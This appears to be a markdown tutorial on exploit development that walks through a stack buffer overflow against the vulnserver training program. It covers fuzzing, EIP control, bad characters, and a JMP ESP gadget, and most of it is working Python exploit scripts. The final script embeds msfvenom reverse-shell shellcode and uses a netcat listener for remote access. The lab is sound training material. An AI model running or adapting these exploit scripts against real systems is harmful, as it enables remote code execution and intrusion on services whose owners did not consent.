# Exploit Development

## Index

- [Required installation](#Required-installations)
- [Spiking](#Spiking)
- [Fuzzing](#Fuzzing)
- [Fiding the Offset](#Finding-the-offset)
- [Overwriting the EIP](#Overwriting-the-EIP)
- [Finding bad characters](#Finding-bad-characters)
- [Finding the right module](#Finding-the-right-module)
- [Shell code and gaining root](#Shell-code-and-gaining-root)

## Required installations

You need to downaload **vulnserver** (.zip) and **immunity debugger**. IF you don't have Python 2.7, you can install it during the execution of **ID**

Go to the immunity debugger and click on `file` --> `attached` --> find your file `vulnserver.exe`

The vulnserver is listenning by default on port 9999.

## Spiking

Spiking is the process to find a way to crash the machine, the program send somes characteres randomly and hope find a breach.
It's just looking for something to break the program.

You can connect with netcat on the machine who run the backdoor (`vulnserver.exe`). --> `nc -nv <victim_ip> <port(default : 9999)>`

Or with the command `generic_send_tcp` --> `genreric_send_tcp <target_ip> <port(default : 9999)> <file>.spk 0 0`

We try with **immunity debugger** so the program will not crash but if we send all kind of file.spk like that :

```
_readline();
s_string("TRUN ");
s_string_variable("0");
```
The immunity debugger is paused and vulnserver not crashed. We see the ESP (*Extended Stack Pointer*) with lot's of characters.
The same character is present multiple times (in hexadecimal form) in the EBP (*Extended Base Pointer*) and the **EIP** (*Extended Instruction Pointer**) 
The **EIP** is the most interesting because it's here that we can execute some malicious code.

We can just replace "TRUN " by "STATS " or other word defined when you did the `nc` command.
For some file, it will not crash, but for some it will crash.
In our example, `trun` command is vulnerable so we keep this example until the end.

## Fuzzing

The fuzzing is similar to spiking because we are going to be sending bunch of random character at a specific command and trying to break it.

The difference is fuzzing appears after you know which command is vulnerable.
 
We try to know where the program crashed, how many bytes we can send in order to crash the program. We can do this with a python script : 

```
#!/usr/bin/python
import socket, sys
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<victim_ip>', <port(default : 9999)>))
	
		s.send(('TRUN /.:/' + buffer))					| <-- the "/.:/" is required for the program in order to understand
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100					| <-- the buffer is icrementing with hundred of "A" each time 

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))		| <-- we print the length of the buffer when the program crashed (how many bytes). 
		sys.exit() 

```

You can see the **immunity debugger** is paused, you can ^C the program .py and see at *how many bites* the program crashed.

## Finding the Offset

Finding the offset means finding where we overwrite the EIP because that's what we want to control.
When we have the number of bytes aproximatively, we have to create a new buffer, we call it the offset, with a tool in metasploit framework.

Create this pattern --> `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <python_script_result>` -->  generate a string

You can modify the python script.

``` 
#!/usr/bin/python
import socket, sys

offset = "<pattern>"								| <-- paste the result pattern of the metasploit tool

while True: 
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + offset))
                s.close()
        except:   
                print "Error connecting to server"
                sys.exit()

```
The program crashed and you need to know where, so we use another metasploit tool.

--> `usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <same_value_as_we_created> -q <EIP_value_in_immunity_debugger>`

--> It gives you the exact offset match with the number of bytes. At this number of bytes, we can control the EIP.

## Overwriting the EIP

If your result is 2003 bytes for example, it means that there is 2003 before the EIP. The EIP is 4 bytes long. We have to overwrite those 4 specific bytes.

You can modify the .py in order to make sure the EIP is at the write value:

```
#!/usr/bin/python
import socket, sys

shellcode = "A" * <number_of_bytes_before_the_EIP> + "B" * 4

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        except:
                print "Error connecting to server"
                sys.exit()
```
You can check if the EIP value is well equal to "42424242".

## Finding bad characters

Search `badchars` in google and go to the bulbsecurity site. Copy the badchars variable (You have to delete \x00 because it acts up by default) 

Modify the .py :


```
#!/usr/bin/python 
import socket, sys

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True: 
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        except:
                print "Error connecting to server"
                sys.exit()
```

In the **immunity debugger** the interisting part is the hex dump. Check if there is some hex missing.

Identify all of them and note the correspondance.

## Finding the right module

When we talk about finding the right module, we're looking for a dll or something similar inside of our program that has no memory protections (SafeSEH, ASLR, OS dll...)

The mona module allows us to do so --> https://github.com/corelan/mona/blob/master/mona.py

Put the mona.py into --> C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\

Import the mona module in Immunity debugger. --> `!mona modules`

In the "Module Info" part, you can see a dll with no memory protection : (SafeSEH = False, ASLR = False...) --> in our case it's essfunc.dll

Find the hex code equivalent to a jump with `nasm` 

--> `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` -->  `JMP ESP`	| <-- We're going to use this as a pointer, the pointer is going to jump to our malicious shell code.

--> The result is "FFE4"

Go back to **immunity debugger" and type `!mona find -s "\xff\xe4" -m essfunc.dll`			| <-- The command JUMP with the module we find.

We are interisting about the return addresses. Take notes of them. --> In our case, the first one is `0x625011af`

You can modify the .py :

```
#!/usr/bin/python
import socket, sys

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"					| <-- We put the adress of the .dll in reverse because of
										| the x86 architecture stores the low order bite at the lowest
										| address in the high order bite at the highest address. 
while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        except:
                print "Error connecting to server"
                sys.exit()

```

Enter a expression to follow <br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/Capture_immunity.PNG><br>
The expression coresspond to the adress of the .dll we have found --> in our case `625011af`.

Click OK and in a environment test, you can press F2 to set a breaking at the line where there is the command `JMP ESP`. 

Run the .py.

You see that the program stop at our breakpoint, the EIP is the adress of the .dll with no memory protection so we need to generate some shell code and point directly to that shell code.

## Shell code and gaining root

`msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip_adress> LPORT=<port_listening(4444 ?)> EXITFUNC=thread -f c -a x86 -b "<bad_chars_you_noticed>"`

The EXICTFUNC equal to "thread" because it is make our exploit more stable.

The -f equal to "c" because we want a .c file

The -a equal to "x86" for the architecture --> Don't forget the \x00 [!!]

Paste the result into the .py :

```
#!/usr/bin/python
import socket, sys

overflow = ( "\xd9\xec\xd9\x74\x24\xf4\xbb\x06\x1a\xb9\x9a\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\xc4\x1e\x5b\x6f\x34\xf6\x19"
"\x90\xc4\x07\x7e\x18\x21\x36\xbe\x7e\x22\x69\x0e\xf4\x66\x86"
"\xe5\x58\x92\x1d\x8b\x74\x95\x96\x26\xa3\x98\x27\x1a\x97\xbb"
"\xab\x61\xc4\x1b\x95\xa9\x19\x5a\xd2\xd4\xd0\x0e\x8b\x93\x47"
"\xbe\xb8\xee\x5b\x35\xf2\xff\xdb\xaa\x43\x01\xcd\x7d\xdf\x58"
"\xcd\x7c\x0c\xd1\x44\x66\x51\xdc\x1f\x1d\xa1\xaa\xa1\xf7\xfb"
"\x53\x0d\x36\x34\xa6\x4f\x7f\xf3\x59\x3a\x89\x07\xe7\x3d\x4e"
"\x75\x33\xcb\x54\xdd\xb0\x6b\xb0\xdf\x15\xed\x33\xd3\xd2\x79"
"\x1b\xf0\xe5\xae\x10\x0c\x6d\x51\xf6\x84\x35\x76\xd2\xcd\xee"
"\x17\x43\xa8\x41\x27\x93\x13\x3d\x8d\xd8\xbe\x2a\xbc\x83\xd6"
"\x9f\x8d\x3b\x27\x88\x86\x48\x15\x17\x3d\xc6\x15\xd0\x9b\x11"				| <-- this is the result of the msfvenom command
"\x59\xcb\x5c\x8d\xa4\xf4\x9c\x84\x62\xa0\xcc\xbe\x43\xc9\x86"
"\x3e\x6b\x1c\x08\x6e\xc3\xcf\xe9\xde\xa3\xbf\x81\x34\x2c\x9f"
"\xb2\x37\xe6\x88\x59\xc2\x61\x77\x35\xcd\x77\x1f\x44\xcd\x66"
"\x83\xc1\x2b\xe2\x2b\x84\xe4\x9b\xd2\x8d\x7e\x3d\x1a\x18\xfb"
"\x7d\x90\xaf\xfc\x30\x51\xc5\xee\xa5\x91\x90\x4c\x63\xad\x0e"
"\xf8\xef\x3c\xd5\xf8\x66\x5d\x42\xaf\x2f\x93\x9b\x25\xc2\x8a"
"\x35\x5b\x1f\x4a\x7d\xdf\xc4\xaf\x80\xde\x89\x94\xa6\xf0\x57"
"\x14\xe3\xa4\x07\x43\xbd\x12\xee\x3d\x0f\xcc\xb8\x92\xd9\x98"
"\x3d\xd9\xd9\xde\x41\x34\xac\x3e\xf3\xe1\xe9\x41\x3c\x66\xfe"
"\x3a\x20\x16\x01\x91\xe0\x36\xe0\x33\")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow			| <-- we adding some nops (no operation) between the jump and the payload  just for safety

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        except:
                print "Error connecting to server"
                sys.exit()
```

Listen on the port you specified : `nc -nvlp <port>`

Run the .py and you have gained access.
